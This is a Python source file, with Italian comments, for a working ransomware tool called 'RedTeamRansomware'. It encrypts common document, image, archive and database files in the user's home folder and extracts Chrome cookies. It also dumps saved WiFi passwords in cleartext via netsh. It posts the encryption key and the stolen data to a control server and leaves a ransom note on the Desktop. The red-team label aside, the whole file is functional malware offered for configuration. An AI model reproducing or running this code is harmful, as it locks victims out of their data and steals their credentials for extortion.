import os
import json
import sqlite3
import subprocess
import requests
from cryptography.fernet import Fernet
import shutil
from pathlib import Path
import base64
import uuid
import argparse
import sys

# ========== CONFIGURAZIONE GLOBALE ==========
# ⚠️ MODIFICA QUESTE VARIABILI PER CONFIGURARE IL RANSOMWARE ⚠️

SERVER_URL = "http://localhost:8573"  # URL del server dashboard

# Estensioni file da cifrare
TARGET_EXTENSIONS = [
    '.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx', 
    '.jpg', '.png', '.zip', '.rar', '.7z', '.mp4', '.mp3',
    '.ppt', '.pptx', '.sql', '.db', '.mdb', '.accdb'
]

# Cartelle da escludere dalla cifratura
EXCLUDED_DIRS = [
    'Windows', 'Program Files', 'Program Files (x86)',
    'System32', 'syswow64', 'boot', 'recovery'
]

# Comportamento del ransomware
ENCRYPT_USER_PROFILE = True    # Cifra la cartella user
COLLECT_COOKIES = True         # Raccoglie cookie browser
COLLECT_WIFI = True            # Raccoglie password WiFi
CREATE_RANSOM_NOTE = True      # Crea nota di riscatto

# ========== FINE CONFIGURAZIONE ==========

class RedTeamRansomware:
    def __init__(self, mode="encrypt", decryption_key=None):
        self.server_url = SERVER_URL
        self.mode = mode
        self.key = None
        self.cipher = None
        self.target_id = None
        
        self.target_extensions = TARGET_EXTENSIONS
        self.excluded_dirs = EXCLUDED_DIRS

        # Inizializza in base alla modalità
        if mode == "encrypt":
            self.key = Fernet.generate_key()
            self.cipher = Fernet(self.key)
            self.target_id = str(uuid.uuid4())
        elif mode == "decrypt" and decryption_key:
            try:
                self.key = base64.b64decode(decryption_key)
                self.cipher = Fernet(self.key)
            except Exception as e:
                print(f"❌ Invalid decryption key")
                sys.exit(1)

    def encrypt_file(self, file_path):
        try:
            with open(file_path, 'rb') as file:
                file_data = file.read()
            
            encrypted_data = self.cipher.encrypt(file_data)
            
            with open(file_path, 'wb') as file:
                file.write(encrypted_data)
            
            new_name = file_path + '.encrypted'
            os.rename(file_path, new_name)
            return True
        except Exception:
            return False

    def decrypt_file(self, file_path):
        try:
            if not file_path.endswith('.encrypted'):
                return False
            
            with open(file_path, 'rb') as file:
                encrypted_data = file.read()
            
            decrypted_data = self.cipher.decrypt(encrypted_data)
            original_path = file_path[:-10]
            
            with open(original_path, 'wb') as file:
                file.write(decrypted_data)
            
            os.remove(file_path)
            return True
            
        except Exception:
            return False

    def find_encrypted_files(self, start_path="."):
        encrypted_files = []
        for root, dirs, files in os.walk(start_path):
            for file in files:
                if file.endswith('.encrypted'):
                    file_path = os.path.join(root, file)
                    encrypted_files.append(file_path)
        return encrypted_files

    def encrypt_files(self, start_path=None):
        if start_path is None:
            start_path = os.path.expanduser("~")
        
        encrypted_files = []
        for root, dirs, files in os.walk(start_path):
            dirs[:] = [d for d in dirs if d not in self.excluded_dirs]
            for file in files:
                file_path = os.path.join(root, file)
                file_ext = os.path.splitext(file_path)[1].lower()
                if file_ext in self.target_extensions:
                    if self.encrypt_file(file_path):
                        encrypted_files.append(file_path)
        return encrypted_files

    def decrypt_files(self, start_path=None):
        if start_path is None:
            start_path = os.path.expanduser("~")
        
        encrypted_files = self.find_encrypted_files(start_path)
        if not encrypted_files:
            return 0
        
        success_count = 0
        for file_path in encrypted_files:
            if self.decrypt_file(file_path):
                success_count += 1
        return success_count

    def get_chrome_cookies(self):
        cookies_data = []
        try:
            chrome_path = os.path.expanduser('~') + r"\AppData\Local\Google\Chrome\User Data\Default\Cookies"
            if os.path.exists(chrome_path):
                temp_db = "temp_cookies.db"
                shutil.copy2(chrome_path, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, value FROM cookies LIMIT 50")
                for host, name, value in cursor.fetchall():
                    cookies_data.append({'host': host, 'name': name, 'value': value})
                conn.close()
                os.remove(temp_db)
        except Exception:
            pass
        return cookies_data

    def get_wifi_passwords(self):
        wifi_data = []
        try:
            profiles = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], 
                                             encoding='utf-8', errors='ignore')
            profile_names = []
            for line in profiles.split('\n'):
                if "All User Profile" in line:
                    profile_name = line.split(":")[1].strip()
                    profile_names.append(profile_name)
            for profile in profile_names[:10]:
                try:
                    profile_info = subprocess.check_output(
                        ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'],
                        encoding='utf-8', errors='ignore'
                    )
                    for line in profile_info.split('\n'):
                        if "Key Content" in line:
                            password = line.split(":")[1].strip()
                            wifi_data.append({'ssid': profile, 'password': password})
                except:
                    continue
        except Exception:
            pass
        return wifi_data

    def send_data_to_server(self):
        try:
            data = {
                'target_id': self.target_id,
                'encryption_key': base64.b64encode(self.key).decode('utf-8'),
                'cookies': {'chrome': self.get_chrome_cookies()},
                'wifi_passwords': self.get_wifi_passwords()
            }
            response = requests.post(f"{self.server_url}/register_target", json=data, timeout=30)
            return response.status_code == 200
        except Exception:
            return False

    def create_ransom_note(self):
        note = f"""
        ===========================================
        |           YOUR FILES ARE ENCRYPTED      |
        ===========================================
        
        All your important files have been encrypted!
        Your Target ID: {self.target_id}
        
        Contact the administrator with this Target ID
        to recover your files.
        
        Do NOT attempt to decrypt files without the key!
        ===========================================
        """
        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
        note_path = os.path.join(desktop_path, "READ_ME.txt")
        with open(note_path, 'w') as f:
            f.write(note)

    def run_encryption(self):
        print("Encrypting files...")
        
        if ENCRYPT_USER_PROFILE:
            encrypted_files = self.encrypt_files()
            print(f"Encrypted: {len(encrypted_files)} files")
        
        if COLLECT_COOKIES or COLLECT_WIFI:
            self.send_data_to_server()
        
        if CREATE_RANSOM_NOTE:
            self.create_ransom_note()
        
        print(f"Target ID: {self.target_id}")

    def run_decryption(self):
        print("Decrypting files...")
        decrypted_count = self.decrypt_files()
        print(f"Decrypted: {decrypted_count} files")

def main():
    parser = argparse.ArgumentParser(description='File Utility', add_help=False)
    parser.add_argument('-d', '--decrypt', type=str, help='Decryption key')
    
    args = parser.parse_args()
    
    # Modalità decifratura
    if args.decrypt:
        ransomware = RedTeamRansomware(mode="decrypt", decryption_key=args.decrypt)
        ransomware.run_decryption()
    # Modalità cifratura (default)
    else:
        ransomware = RedTeamRansomware(mode="encrypt")
        ransomware.run_encryption()

if __name__ == "__main__":
    main()
